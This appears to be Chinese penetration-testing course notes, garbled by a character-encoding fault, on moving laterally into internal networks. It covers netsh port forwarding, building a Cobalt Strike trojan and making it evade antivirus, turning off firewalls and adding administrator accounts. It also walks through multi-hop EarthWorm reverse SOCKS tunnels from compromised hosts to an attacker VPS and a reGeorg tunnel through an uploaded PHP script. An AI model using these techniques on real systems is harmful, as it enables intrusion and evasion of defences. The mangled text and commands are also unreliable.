ä¹‹åï¼Œpingä¸€ä¸‹ä¸å°±çŸ¥é“äº†å—ï¼Œä½†æ˜¯pingä¸èµ°sockçš„tcpåè®®ã€‚pingä½¿ç”¨çš„æ˜¯ ICMP æˆåŠŸäº†ä¹‹åï¼Œè¡¨ç¤ºkalièƒ½å¤Ÿæ­£å¸¸å’Œç›®æ ‡ä¸»æœºè¿æ¥äº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨kaliçš„æ”»å‡»è½½è·è¿›è¡Œæ”»å‡»æ‹‰å–shelläº†ï¼Œå‰é¢å­¦è¿‡çš„ï¼Œæ‰€ä»¥å°±ä¸æ¼”ç¤ºäº†ã€‚ 10-7-11 æ‰‹å·¥åˆ›å»ºsocketä»£ç†å‚è€ƒç½‘å€ï¼šhttps://blog.csdn.net/qq_34801745articledetails111089087 win2003ä¸€ä¸ªç½‘å¡ï¼ˆ10.0.0.4ï¼‰å’Œwin7çš„ç¬¬äºŒå¼ ç½‘å¡åœ¨åŒä¸€ä¸ªæ®µï¼Œkaliå’Œwin7çš„ç¬¬ä¸€ä¸ªç½‘å¡åœ¨ä¸€ä¸ªæ®µ(192.168.0.6)ã€‚é‚£è¿™æ ·çš„è¯æ˜¯win2003å±äºå†…ç½‘æœºå™¨ä¸èƒ½ä¸Šç½‘ï¼Œwin7å¯ä»¥ä¸Šç½‘å¹¶ä¸”è¿æ¥ç€å†…ç½‘çš„win2003ï¼Œkaliå¯ä»¥ä¸Šç½‘ï¼Œèƒ½è¿æ¥win7.æˆ‘ä»¬çš„ç›®æ ‡æ˜¯é€šè¿‡kaliæ§åˆ¶ä¸èƒ½ä¸Šç½‘çš„win2003æœºå™¨ï¼Œå†…ç½‘æ¸—é€ã€‚ è¿™é‡Œå€ŸåŠ©åˆ°äº†netshæŒ‡ä»¤ï¼Œé€šè¿‡è¿™ä¸ªæŒ‡ä»¤èƒ½åšsockä»£ç†ï¼Œæ˜¯å¾®è½¯è‡ªå¸¦çš„ï¼Œwin7åŠä¹‹åçš„windowsç³»ç»Ÿç‰ˆæœ¬éƒ½æ”¯æŒè¿™ä¸ªæŒ‡ä»¤ï¼Œwindows2003ä¹Ÿæ”¯æŒï¼Œä½†æ˜¯éœ€è¦å®‰è£…é…ç½®ipv6æ‰è¡Œã€‚ 1ã€windowsä»£ç†æœåŠ¡å™¨æ“ä½œ é¦–å…ˆæ–°å»ºç«¯å£æ˜ å°„ï¼Œä»¥åŠæŸ¥çœ‹è½¬å‘è§„åˆ™å»ºç«‹æˆåŠŸ netsh interface portproxy add v4tov4 listenportç›‘å¬çš„ç«¯å£ connectaddressè¢«æ”»å‡»è€…æœåŠ¡å™¨ip connectportè¢«æ”»å‡»è€…æœåŠ¡ç«¯å£ # ç›‘å¬çš„ç«¯å£ï¼Œè‡ªå®šä¹‰ # è¢«æ”»å‡»è€…æœåŠ¡å™¨ipï¼Œæ¯”å¦‚10.0.0.4 # è¢«æ”»å‡»è€…æœåŠ¡ç«¯å£ netsh interface portproxy show all #æŸ¥çœ‹è½¬å‘è§„åˆ™ è¢«æ”»å‡»è€…ç«¯å£ï¼Œæ¯”å¦‚å°±æ˜¯æˆ‘ä»¬è¿™ä¸ªç½‘ç«™çš„ç«¯å£ï¼Œ81ç«¯å£å§ï¼Œèƒ½è®¿é—®è¿™ä¸ªç½‘ç«™è¡¨ç¤ºè¿™ä¸ªç«¯å£æ˜¯é€šç•…çš„ã€‚ ä¾‹å¦‚ netsh interface portproxy add v4tov4 listenport1111 connectaddress10.0.0.4 connectport81 æ‹¿åˆ°win7ä¸Šè¿è¡Œä¸€ä¸‹ï¼Œæ³¨æ„è¦ä»¥ç®¡ç†å‘˜çš„èº«ä»½æ¥æ‰§è¡Œã€‚ æŸ¥çœ‹è½¬å‘è§„åˆ™ ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬è®¿é—®win7çš„1111ç«¯å£çš„æ—¶å€™ï¼Œå®é™…ä¸Šè®¿é—®çš„æ˜¯10.0.0.4çš„81ç«¯å£ã€‚ 2ã€netshæˆåŠŸè½¬å‘ å¯ä»¥çœ‹åˆ°æˆåŠŸé€šè¿‡ç«¯å£è½¬å‘ï¼Œå¤–ç½‘æ”»å‡»è€…kaliæˆåŠŸé€šè¿‡æµè§ˆå™¨è®¿é—®å¸¦äº†å†…ç½‘çš„webæœåŠ¡å™¨ä¸šåŠ¡é¡µé¢ã€‚åœ¨æˆ‘ä»¬ç‰©ç†æœºä¸Šï¼Œä¹Ÿå°±æ˜¯å’Œwin7çš„ç¬¬ä¸€å¼ ç½‘å¡åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘çš„ä¸»æœºè®¿é—®ä¸€ä¸‹win7ç¬¬ä¸€å¼ ç½‘å¡å’Œ1111ç«¯å£ï¼Œå°±çœ‹åˆ°äº†win2003çš„81ç«¯å£æ•ˆæœ é€šè¿‡è¿™ç§æ‰‹å·¥çš„æ–¹å¼åšå†…ç½‘å†…é€æ˜¯éå¸¸ä¸é”™çš„é€‰æ‹©ï¼Œå¹¶ä¸”æ˜¯å…æ€çš„ï¼Œå› ä¸ºè¿™ä¸ªnetshæŒ‡ä»¤æ˜¯å¾®è½¯è‡ªå¸¦çš„ã€‚ 10-7-12 csææƒä¸å†…ç½‘æ¸—é€æ’ä»¶ææƒå·¥å…·ç½‘å€ https://github.com/rsmudge/Elevatekit https://k8gege.org/Download/ https://github.com/k8gege/Aggressor ç¬¬ä¸€ä¸ªè¿æ¥åœ°å€çš„å·¥å…·å’Œä¸€ä¸ªladonå·¥å…·(æ‰«æå·¥å…·)æˆ‘å·²ç»ç»™å¤§å®¶ä¸‹è½½å¥½äº†ï¼Œå°±åœ¨æ˜¨å¤©ç»™å¤§å®¶çš„CSå·¥å…·ä¸­äº† ç„¶åï¼Œæ‰“å¼€è„šæœ¬ç®¡ç†å™¨ CSè‡ªå¸¦çš„ææƒï¼Œè¿™ä¸ªåŠŸèƒ½ä¸æ˜¯å¾ˆå¥½ï¼Œå…¶ä»–çš„åŠŸèƒ½éƒ½è¿˜å¯ä»¥ã€‚ å®ƒçš„å‡ ä¸ªpayloadéƒ½ä¸å¤ªå¥½ç”¨ çœ‹ä¸€ä¸‹K8ladonç¬¬ä¸‰æ–¹æ’ä»¶çš„ç›¸å…³åŠŸèƒ½ï¼Œè¿™æ˜¯ä¸ªä¸“é—¨åšå†…ç½‘æ¸—é€çš„å·¥å…·,ï¼ŒåŠ ä¸Šäº†è¿™äº›æ’ä»¶ä¹‹åï¼Œå†…ç½‘æ¸—é€å°±äº‹åŠåŠŸå€äº†ã€‚ä¹Ÿæ˜¯CSç‰›é€¼çš„ä¸€ç‚¹ï¼Œå¯ä»¥åŠ è½½å„ç§ç¬¬ä¸‰æ–¹æ’ä»¶ã€‚ ç›®å‰å¸‚é¢ä¸Šå¤§å®¶åšæ¸—é€ç”¨çš„æœ€å¤šçš„å°±æ˜¯CS æˆ‘è¿˜ç»™å¤§å®¶å‡†å¤‡äº†ä¸€äº›å…¶ä»–æ’ä»¶ï¼Œç½‘ä¸Šä¸‹è½½çš„ã€‚ 10-7-13 cs4.013-1 åˆ›å»ºç›‘å¬å™¨1ã€ç‚¹å‡» Cobalt Strike - Listeners-Addï¼Œå…¶ä¸­å†…ç½®äº†å…«ä¸ªPayloadï¼Œ wndowsbeacon_dnsreverse_dns_txt windowsbeacon_httpreverse_http windowsbeacon_httpsreverse_https windowsbeacon_bind_pipe windowsbeacon_tcp windowsbeacon_extc2 windowsforeignreverse_http windowsforeignreverse_https 2ã€windowsbeaconä¸ºå†…ç½®ç›‘å¬å™¨ï¼ŒåŒ…æ‹¬dnsã€httpã€httpsã€smbã€tcpã€extc2å…­ç§æ–¹å¼çš„ç›‘å¬å™¨ï¼›windowsforeignä¸ºå¤–éƒ¨ç›‘å¬å™¨ã€‚ 13-2 ç”Ÿæˆæœ¨é©¬ç‚¹å‡»Attacks-Packages-Windows Executableï¼Œç‚¹å‡»Generateç”Ÿæˆï¼Œé€‰æ‹©ç”Ÿæˆçš„è·¯å¾„åŠæ–‡ä»¶åä¿å­˜å³å¯ã€‚ 13-3 è¿è¡Œæœ¨é©¬å°†ç”Ÿæˆçš„exeæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºè¿è¡Œï¼Œè‡ªåŠ¨åœ¨å®¢æˆ·ç«¯ä¸Šçº¿ 10-7-14 CSå…æ€åœ¨çº¿shellcodeç”Ÿæˆï¼Œ https://go.xn--9tr.com/ æˆ‘ä»¬çŸ¥é“cså¯ä»¥ç”Ÿæˆå„ç±»è¯­è¨€çš„payloadï¼Œä¸€èˆ¬æŠ¤ç½‘ä¸­çº¢é˜Ÿç”¨cè¯­è¨€çš„æ¯”è¾ƒå¤šï¼Œç”Ÿæˆcè¯­è¨€çš„æœ¨é©¬ä¹‹åï¼Œå°†payloadæ”¾åˆ°è¿™é‡Œï¼Œç‚¹å‡»ç”Ÿæˆï¼Œä»–ä¼šè‡ªåŠ¨ç»™ä½ ç”Ÿæˆä¸€ä¸ª16è¿›åˆ¶çš„.exeç¨‹åºï¼Œèƒ½å¤Ÿå…æ€ã€‚ä¸ä¿¡ç”Ÿæˆå®Œä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥æ”¾åˆ°ä¸–ç•Œæ€æ¯’ç½‘ï¼Œæœ‰å¥½å¤šè¿™ç§ç—…æ¯’æ£€æµ‹ç½‘ç«™ï¼Œæ¯”å¦‚ç”¨ä¸‹é¢è¿™ä¸ªï¼Œæˆ‘ä»¬ä¹‹å‰ç”¨è¿‡è¿™ä¸ªç½‘ç«™ã€‚ äº›ç½‘ç«™ä¸­è°ƒç”¨çš„è¿™äº›æ€æ¯’è½¯ä»¶ï¼Œä»–ä»¬éƒ½æ˜¯å¯¹ç°æœ‰çš„ç—…æ¯’æˆ–è€…æœ¨é©¬è¿›è¡Œé€†å‘åŠŸèƒ½ï¼Œææƒé‡Œé¢çš„ç‰¹å¾ç ï¼ŒåŠ å…¥åˆ°è‡ªå·±çš„æ£€æµ‹åº“é‡Œé¢ï¼Œå¦‚æœä½ ç»™å®ƒçš„ç¨‹åºä»£ç ä¸­æœ‰å®ƒå·²ç»å­˜ä¸Šçš„ç‰¹å¾ç ï¼Œé‚£ä¹ˆå°±ä¼šè¢«æ£€æµ‹å‡ºæ¥ã€‚ 10-7-15 sock4å’Œsock5çš„åŒºåˆ«socksæ˜¯ä¸€ä¸ªåè®®ï¼Œ ## socks4å’Œsocks5éƒ½å±äºsocksåè®®ï¼Œåªæ˜¯ç”±äºæ‰€æ”¯æŒçš„å…·ä½“åº”ç”¨ä¸åŒè€Œå­˜åœ¨å·®å¼‚ã€‚socks4ä»£ç†åªæ”¯æŒTCPåº”ç”¨ï¼Œè€Œsocks5ä»£ç†åˆ™å¯ä»¥æ”¯æŒTCPå’ŒUDPä¸¤ç§åº”ç”¨ã€‚ä¸è¿‡ç”±äºsocks5ä»£ç†è¿˜æ”¯æŒå„ç§èº«ä»½éªŒè¯æœºåˆ¶ï¼ŒæœåŠ¡å™¨ç«¯åŸŸåè§£æç­‰ï¼Œè€Œsocks4ä»£ç†æ²¡æœ‰ï¼Œæ‰€ä»¥é€šå¸¸å¯¹å¤–å¼€æ”¾çš„socksä»£ç†éƒ½æ˜¯socks4ä»£ç†ï¼Œå› æ­¤,UDPåº”ç”¨é€šå¸¸éƒ½ä¸èƒ½è¢«æ”¯æŒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œsocks4èƒ½å¹²çš„socks5éƒ½å¯ä»¥å¹²ï¼Œåè¿‡æ¥å°±ä¸è¡Œäº†ã€‚ 10-7-16 å†…ç½‘æ¸—é€ä¹‹ä¿¡æ¯æ”¶é›†16-1 æŸ¥çœ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬å’Œè¡¥ä¸ä¿¡æ¯win10 cmdä¸­è¾“å…¥ï¼šsysteminfoï¼Œç³»ç»Ÿä¿¡æ¯å’Œè¡¥ä¸ä¿¡æ¯éƒ½æœ‰ linux:centos7 æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ cat etcredhat-release æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ cat procversion uname -r è¡¥ä¸æƒ…å†µï¼šhttps://www.csdn.net/tags/NtzaggwsNjc0ODEtYmxvZwO0O0OO0O0O.html 16-2 ç³»ç»ŸæŸ¥çœ‹ç”¨æˆ·å’Œç”¨æˆ·ç»„win10: net user #æŸ¥çœ‹æ‰€æœ‰è´¦æˆ· net user ç”¨æˆ·å #æŸ¥çœ‹ç”¨æˆ·è¯¦ç»†ä¿¡æ¯ net user ç”¨æˆ·å æ–°å¯†ç  #ç»™ç”¨æˆ·æ”¹å¯†ç ï¼ˆåªæœ‰ç®¡ç†å‘˜å¯ä½¿ç”¨ï¼‰ net user ç”¨æˆ·å å¯†ç  addï¼ˆdelï¼‰ # åˆ›å»ºï¼ˆåˆ é™¤ï¼‰ç”¨æˆ·åå’Œå¯†ç  net localgroup #åˆ—å‡ºæ‰€æœ‰ç»„ net localgroup ç»„å add #æ–°å»ºç»„ net localgroup ç»„å #æŸ¥çœ‹è¯¥ç»„æˆå‘˜ net localgroup administrator ç”¨æˆ·å addï¼ˆdelï¼‰ # æŠŠç”¨æˆ·æ·»åŠ ï¼ˆæŠŠç”¨æˆ·ä»ç»„ä¸­åˆ é™¤ï¼‰åˆ°ç®¡ç†å‘˜ç»„ net user ç”¨æˆ·å active:yes #æ¿€æ´»è´¦æˆ· net user ç”¨æˆ·å active:no #ç¦ç”¨è´¦æˆ· linuxï¼šcentos7 https://blog.csdn.net/erwange/article/details/104524602 16-3 æŸ¥çœ‹æ˜¯å¦å®‰è£…äº†æ€è½¯çš„æ–¹æ³•æ–¹æ³•1ï¼šé€šè¿‡æŒ‡ä»¤æŸ¥çœ‹ wmic namespace:\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe æ–¹æ³•2ï¼šé€šè¿‡è¿›ç¨‹å¯¹åº”æœåŠ¡å‘½ä»¤æŸ¥çœ‹è¿›ç¨‹ï¼Œé€šè¿‡è¿›ç¨‹æ¥æŸ¥çœ‹æ˜¯å¦ä¸ºæ€è½¯ã€‚ https://maikefee.com/av_list åœ¨ä¸»æœºä¸Šæ‰§è¡Œ tasklist svc å°†ç»“æœæ”¾åˆ°ç½‘ç«™ä¸­å»ï¼Œè¯¥ç½‘ç«™ä¼šè‡ªåŠ¨å°†æ€è½¯ç¨‹åºè¯†åˆ«å‡ºæ¥ã€‚ MsMpeng.exeå®é™…ä¸Šå¾®è½¯è‡ªå®¶å®‰å…¨è½¯ä»¶Microsoft Security Essentialå’ŒWindows Defenderçš„ä¸»è¦è¿›ç¨‹. 16-4 æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€çš„æŒ‡ä»¤win10: netsh advfirewall show allprofiles ## å…³é—­ä¸“ç”¨ç½‘ç»œ(R) netsh firewall set opmode modedisable ## å…³é—­ä¸“ç”¨ç½‘ç»œ(R) å’Œ æ¥å®¾æˆ–å…¬ç”¨ç½‘ç»œ(P) netsh advfirewall set allprofiles state off linuxï¼šcentos7 å¯åŠ¨ï¼š systemctl start firewalld å…³é—­ï¼š systemctl stop firewalld æŸ¥çœ‹çŠ¶æ€ï¼š systemctl status firewalld å¼€æœºç¦ç”¨ ï¼š systemctl disable firewalld å¼€æœºå¯ç”¨ ï¼š systemctl enable firewalld 10-8 ewå·¥å…·çš„ä½¿ç”¨10-8-1 ewæœ‰6ä¸­æ¨¡å¼å’Œå¸¸ç”¨å‚æ•° ewæœ‰å…­ç§æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯ï¼š Â· ssocksd Â· rcsocks Â· rssocks Â· Icx_slave Â· Icx_listen Â· Icx_tran ## ssocksdæ˜¯ç”¨äºæ™®é€šç½‘ç»œç¯å¢ƒä¸‹çš„æ­£å‘è¿æ¥ã€‚ ## rcsockså’Œrssocksç”¨äºåå‘è¿æ¥ã€‚ ## Icx_slaveã€Icx_listenå’ŒIcx_tranç”¨äºå¤æ‚ç½‘ç»œç¯å¢ƒçš„å¤šçº§è¿æ¥ã€‚ å¸¸ç”¨å‚æ•° -I:\t## æŒ‡å®šè¦ç›‘å¬çš„æœ¬åœ°ç«¯å£ -d:\t## æŒ‡å®šè¦åå¼¹åˆ°çš„æœºå™¨ip -e:\t##æŒ‡å®šè¦åå¼¹åˆ°çš„æœºå™¨ç«¯å£ -f:\t## æŒ‡å®šè¦ä¸»åŠ¨è¿æ¥çš„æœºå™¨ip -g:\t## æŒ‡å®šè¦ä¸»åŠ¨è¿æ¥çš„æœºå™¨ç«¯å£ -t:\t## æŒ‡å®šè¶…æ—¶æ—¶é•¿ï¼Œé»˜è®¤ä¸º1000 10-8-2 ä¸€çº§ä»£ç† æ­£å‘ä»£ç† ## å½“ç›®æ ‡æœºå™¨æœ‰ä¸€ä¸ªå…¬ç½‘ipæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å»ºç«‹ä¸€ä¸ªsocks5çš„ä»£ç†ã€‚ .ew -s ssocksd -11080 rootekali:#.ew -s ssocksd -11680 ssocksd 0.0.0.0:1080 â€”[10000 usec]â€“ socks server Tcp â€” Www.baidu.com:80 â€“ -(open) 19 -0â€“(close)usedunused Î¸1000 åå‘ä»£ç† ## å¦‚æœç›®æ ‡ä¸»æœºæ²¡æœ‰å…¬ç½‘ip,åˆ™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå‘ä»£ç†ã€‚åœ¨æˆ‘ä»¬å…¬ç½‘VPS(1.1.1.1)ä¸Šå»ºç«‹ä¸€ä¸ªè½¬æ¥éš§é“ï¼Œå°†VPS 1080ç«¯å£ç›‘å¬çš„æµé‡è½¬å‘åˆ°888ç«¯å£ã€‚ç„¶åç›®æ ‡æœºå™¨ä¸»åŠ¨è¿æ¥æˆ‘ä»¬VPSçš„888ç«¯å£ã€‚ç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¾ç½®ä»£ç†ä¸ºVPSçš„1080ç«¯å£å»ºç«‹ä¸€æ¡é€šå¾€ç›®æ ‡ä¸»æœºå†…ç½‘çš„socks5éš§é“äº†ã€‚ VPS:.ew -s rcsocks -11080 -e 888 ç›®æ ‡æœºå™¨ï¼š.ew -s rssocks -d 1.1.1.1 -e 888 10-8-3 äºŒçº§ä»£ç†äºŒçº§ä»£ç† ## ç°åœ¨æœ‰è¿™ä¹ˆä¸€ç§æƒ…å†µã€‚æœåŠ¡å™¨Aèƒ½å‡ºç½‘ï¼ŒæœåŠ¡å™¨Bä¸èƒ½å‡ºç½‘ï¼Œä½†æ˜¯æœåŠ¡å™¨Bå¯ä»¥è®¿é—®æœåŠ¡å™¨Cä¹Ÿå°±æ˜¯é¶æ ‡ã€‚æœåŠ¡å™¨Aä¸èƒ½è®¿é—®åˆ°æœåŠ¡å™¨Cé¶æ ‡ï¼Œä½†æ˜¯èƒ½é€šæœåŠ¡å™¨Bã€‚ VPS:1.1.1.1 æœåŠ¡å™¨A(Linux):192.168.10.136 æœåŠ¡å™¨B(Windows):192.168.10.128 é¶æ ‡webç³»ç»Ÿï¼šhttp://192.168.10.132 ## æˆ‘ä»¬ç›®å‰æ‹¿åˆ°äº†æœåŠ¡å™¨Aå’ŒæœåŠ¡å™¨Bçš„æƒé™æœåŠ¡å™¨Aå¯ä»¥å‡ºç½‘ï¼Œå¹¶ä¸”å¯ä»¥è®¿é—®æœåŠ¡å™¨B,ä½†æ˜¯è®¿é—®ä¸äº†æŠŠæ ‡webç³»ç»ŸæœåŠ¡å™¨Bä¸èƒ½å‡ºç½‘ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®é¶æ ‡webç³»ç»Ÿ ## é¦–å…ˆï¼Œåœ¨VPSä¸Šå¼€å¯å¦‚ä¸‹ç›‘å¬ï¼Œå°†1080ç«¯å£ç›‘å¬çš„æµé‡éƒ½è½¬å‘åˆ°æœ¬åœ°çš„888ç«¯å£ .ew -s lcx listen -11080 -e 888 [root@VPsä»£ç†åŠéš§é“]#.ew -s resocks -11080 -e 888 rcsocks 0.0.0.0:1080 â€“[10000 usec]-0.0.0.0:888 init cmd_server_for_rc here start listen port here ## ç„¶ååœ¨æœåŠ¡å™¨Bä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œç›‘å¬æœ¬åœ°çš„999ç«¯å£ ew.exe -s ssocksd -1999 C:Mllsers\\xieNDesktop)ew.exe -s asockad -1999 ssocksd 8.8.8.8:999-[18888 usec]ä¸€socks server ## æœ€åå†æœåŠ¡å™¨Aä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†VPSçš„888ç«¯å£å’ŒæœåŠ¡å™¨Bçš„999ç«¯å£è¿æ¥èµ·æ¥ .ew -s Icx_slave -d 1.1.1.1 -e 888 -f 192.168.10.128 -g 999 ## ä»¥ä¸Šå‘½ä»¤éƒ½æ‰§è¡Œå®Œä¹‹åï¼Œè®¾ç½®socks5ä»£ç†ä¸ºVPSçš„1080ç«¯å£ï¼Œå³å¯æˆåŠŸè®¿é—®é¶æ ‡webç³»ç»Ÿï¼Œ [rootevpsä»£ç†åŠéš§é“]#.ew -s rcsocks -11680 -e 888 10-8-4 ä¸‰çº§ä»£ç† ## ç°åœ¨æœ‰è¿™ä¹ˆä¸€ç§æƒ…å†µã€‚æœåŠ¡å™¨Aèƒ½å‡ºç½‘ï¼ŒæœåŠ¡å™¨Bä¸èƒ½å‡ºç½‘ï¼ŒæœåŠ¡å™¨Cä¹Ÿä¸èƒ½å‡ºç½‘ã€‚æœåŠ¡å™¨Aåªèƒ½è®¿é—®æœåŠ¡å™¨Bã€‚æœåŠ¡å™¨Båªèƒ½è®¿é—®æœåŠ¡å™¨Aå’ŒæœåŠ¡å™¨C.æœåŠ¡å™¨Cèƒ½è®¿é—®æœåŠ¡å™¨B,ä¹Ÿèƒ½è®¿é—®é¶æ ‡ã€‚ Â· VPS:1.1.1.1 Â·æœåŠ¡å™¨A(Linux):192.168.10.136 Â·æœåŠ¡å™¨B(Windows):192.168.10.128 Â·æœåŠ¡å™¨C(Linux):192.168.10.129 Â·é¶æ ‡webç³»ç»Ÿï¼šhttp://192.168.10.132 ## æˆ‘ä»¬ç›®å‰æŒåˆ—äº†æœåŠ¡æ®Aã€æœåŠ¡å™¨Bå’Œå¸åŠ¡å™¨Cçš„æƒé™æœåŠ¡å™¨Aå¯ä»¥å‡ºç½‘ï¼Œå¹¶ç›®å¯ä»¥è®¿é—®æœåŠ¡å·®B,ä½†æ˜¯æ±¡åŒä¸äº†ç°æ ‡webç³»ç»ŸæœåŠ¡ç Bä¸èƒ½å‡ºç½‘ï¼Œä½†æ˜¯å¯ä»¥åŠ¨é—®æœåŠ¡å†ŒCæœåŠ¡å™¨Cä¸èƒ½å‡ºç½‘ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®è®°æ ‡ ## é¦–å…ˆï¼Œåœ¨VPSä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†1080ç«¯å£ç›‘å¬çš„æµé‡éƒ½è½¬å‘åˆ°æœ¬åœ°çš„888ç«¯å£ .ew -s rcsocks -11080 -e 888 ## ç„¶ååœ¨æœåŠ¡å™¨Aä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†VPSçš„888ç«¯å£å’Œå†…ç½‘ä¸»æœºBçš„999ç«¯å£è¿æ¥èµ·æ¥ .ew -s lcx_slave -d IPåœ°å€ -e888 -f 192.168.10.128 -g 999lcx_slave:IPåœ°å€ 888 â€“[18080 usec]â€“ 192.168.10.128:999 ## æ¥ç€åœ¨æœåŠ¡å™¨Bä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†ç›‘å¬çš„999ç«¯å£çš„æµé‡éƒ½è½¬å‘ç»™æœ¬åœ°çš„777ç«¯å£ ew.exe -s lcx_listen -1999 -e 777 C:Nlsers\\xie\\Desktopew.exe -s lcx_listen -1999 -e 777 resocks 8.0.0.0:999 â€“[18000 usec]-8.0.8.0:7?? init cnd_server_for_rc here start listen port here ## ä»¥ä¸Šå‘½ä»¤éƒ½æ‰§è¡Œå®Œä¹‹åï¼Œè®¾ç½®socks5ä»£ç†ä¸ºVPSçš„1080ç«¯å£ï¼Œå³å¯æˆåŠŸè®¿é—®é¶æ ‡webç³»ç»Ÿ [rootevPsä»£ç†åŠéš§é“]#Â·ew -s resocks -11080 -e 888 rcsocks 0.0,0.0:1080 â€“[10800 usec]â€“0.0.0.0:888 init cmd_server_for_re here start listen port hererssocks cmd_socket OK! - -(open)usedunused 1999 â€“(close)used d100 rootkal1:-# rootgkali:-#.ew -s lcx_slave -de 888 Â·f 192.168.18.128 -g 9991cx_slave7:888 â€“[10000 usec]Â·â†’192.168.10.128:999- -(open)usedud 1999-(close)usedunused 81688 Â·1Cantos [rootgCentos7ï½]#.ew -s rssocks -d 192.158.10.128 -e 777rssocks 192.168,10.128:777 â€“[1608e usec]â€“ socks serverthe recv ip is 192.168.10.132 Tcp.Â·Â· 192.168.18.132:80â€“8-(open)usedunused 1999â€“(close)usedunused e1000 [rootgvps ~]# proxycheins4 curl http://192.168,10.132 [proxychains] config file found:etcproxychains.conf [proxychains] preloading usr1ib64proxychains-nglibproxychains4.so [proxychains] DLL init: proxychaims-ng 4.11 [proxychains] Dynamie cisin .. 0.0.0.0:1680 192.168.16.132:80 OK hello,word![footgVPS ï½]# [rootevps]# hsitlog csdn.nelon_36119192 10-9 å†…ç½‘è½¬å‘å·¥å…·çš„ä½¿ç”¨å¸¸â»…å†…â½¹è½¬å‘â¼¯å…·çš„åˆ†ç±»ï¼š æŒ‰ç…§åè®®è¿›â¾åˆ†ç±»ï¼Œå¯ä»¥åˆ†ä¸ºï¼šSocksåè®® å’ŒSocketåè®® æŒ‰ç…§â¼¯å…·â¼¯ä½œåŸç†åˆ†ç±»åˆ†ä¸ºï¼š ç«¯â¼è½¬å‘ç±»(éš§é“)å’Œ webä»£ç†ç±» 10-9-1 reGeorgç»“åˆproxychainsä»£ç†é“¾(HTTPéš§é“)reGeoryé€‚â½¤äºå…¬â½¹æœåŠ¡å™¨åªå¼€æ”¾äº†80ç«¯â¼çš„æƒ…å†µã€‚ reGeorgæ˜¯â½¤ python å†™çš„åˆ©â½¤Webè¿›â¾ä»£ç†çš„â¼¯å…·ï¼Œæµé‡åªé€šè¿‡ http ä¼ è¾“ï¼Œä¹Ÿå°±æ˜¯httpéš§é“ã€‚ ç°åœ¨æœ‰è¿™ä¹ˆâ¼€ä¸ªç¯å¢ƒï¼Œæˆ‘ä»¬è·å–åˆ°äº†ä½äºå…¬â½¹WebæœåŠ¡å™¨çš„æƒé™ï¼Œæˆ–è€…æˆ‘ä»¬æ‹¥æœ‰å¯ä»¥å¾€å…¬â½¹WebæœåŠ¡å™¨webâ½¬å½•ä¸‹ä¸Šä¼ ä»»ä½•â½‚ä»¶çš„æƒé™ï¼Œä½†æ˜¯è¯¥æœåŠ¡å™¨å¼€å¯äº†é˜²â½•å¢™ï¼Œåªå¼€æ”¾äº†80ç«¯â¼ã€‚å†…â½¹ä¸­å­˜åœ¨å¦å¤–â¼€å°ä¸»æœºï¼Œè¿™â¾¥å‡è®¾å†…â½¹å­˜åœ¨â¼€å°WebæœåŠ¡å™¨ã€‚ç„¶åï¼Œæˆ‘ä»¬ç°åœ¨è¦å°†å…¬â½¹WebæœåŠ¡å™¨è®¾ç½®ä¸ºä»£ç†ï¼Œé€šè¿‡å…¬â½¹æœåŠ¡å™¨çš„80ç«¯â¼ï¼Œè®¿é—®å’Œæ¢æµ‹å†…â½¹WebæœåŠ¡å™¨çš„ä¿¡æ¯ã€‚ æ ¹æ®å…¬â½¹æœåŠ¡å™¨â½¹ç«™æ˜¯å“ªç§è„šæœ¬ç±»å‹ä¸Šä¼ å“ªç§ç±»å‹çš„è„šæœ¬ï¼Œè¿™â¾¥æˆ‘æ­å»ºçš„æ˜¯phpç¯å¢ƒï¼Œæ‰€ä»¥ä¸Šä¼ phpè„šæœ¬ ç„¶åæˆ‘ä»¬åœ¨æ”»å‡»æœºä¸Šæ‰§â¾å¦‚ä¸‹è¯­å¥ python2 reGeorgSocksProxy.py -l 0.0.0.0 -p 1080 -u http://100.100.10.12/tunnel.nosocket.php #è¡¨ç¤ºæœ¬åœ°1080ç«¯â¼çš„æµé‡éƒ½è½¬å‘ç»™æŒ‡å®šçš„é‚£ä¸ª url ## ç„¶åé…ç½®proxychainsä»£ç†é“¾çš„é…ç½®â½‚ä»¶etcproxychains.conf ï¼Œå°†ä»£ç†è®¾ç½®æˆæœ¬æœºçš„1080ç«¯â¼ï¼š socks5 127.0.0.1 1080 ## ç„¶åå‘½ä»¤å‰â¾¯åŠ ä¸Š proxychainså³å¯ã€‚å¦‚ï¼š proxychains curl 192.168.10.19 ## æ‰€ä»¥æˆ‘ä»¬æµé‡çš„â¾›å‘æ˜¯ï¼š æµé‡-æœ¬åœ°1080ç«¯â¼-webæœåŠ¡å™¨çš„80ç«¯â¼(é€šè¿‡æˆ‘ä»¬ä¸Šä¼ çš„phpâ½‚ä»¶è¿›â¾æµé‡è½¬å‘)-å†…â½¹æœåŠ¡å™¨-webæœåŠ¡å™¨çš„80ç«¯â¼-æœ¬åœ°1080ç«¯â¼ 